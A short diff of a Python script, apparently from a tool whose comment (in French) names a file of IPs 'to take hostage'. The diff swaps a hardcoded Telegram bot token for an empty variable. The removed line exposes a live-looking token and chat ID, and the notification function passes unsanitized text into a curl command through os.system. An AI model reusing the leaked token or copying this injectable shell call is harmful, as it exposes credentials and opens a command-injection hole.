@@ -6,6 +6,7 @@ from time import gmtime, strftime, sleep
 FILE_CREATION_IP = "ip.json"
 GOOD_FILE = 'good.log'
 BAD_FILE = 'bad.log'
+API_TELEGRAM_API_KEY = ""
 
 #OBLIGATOIRE Fichier contenant les IPs à prendre en otage
 IP_LIST = 'list.ip'
@@ -22,7 +23,7 @@ def logger(e,l=BAD_FILE):
 
 def notification(notif):
     try:
-        os.system('curl -s -X POST https://api.telegram.org/bot5242141068:AAHNvePdtgr2ucmdfjDuYwH6htKHt78HY-8/sendMessage -d chat_id=1746121134 -d text="'+notif+'"')
+        os.system('curl -s -X POST https://api.telegram.org/'+API_TELEGRAM_API_KEY+'/sendMessage -d chat_id=1746121134 -d text="'+notif+'"')
     except Exception as e:
         logger("Notification BUG : "+e)
 
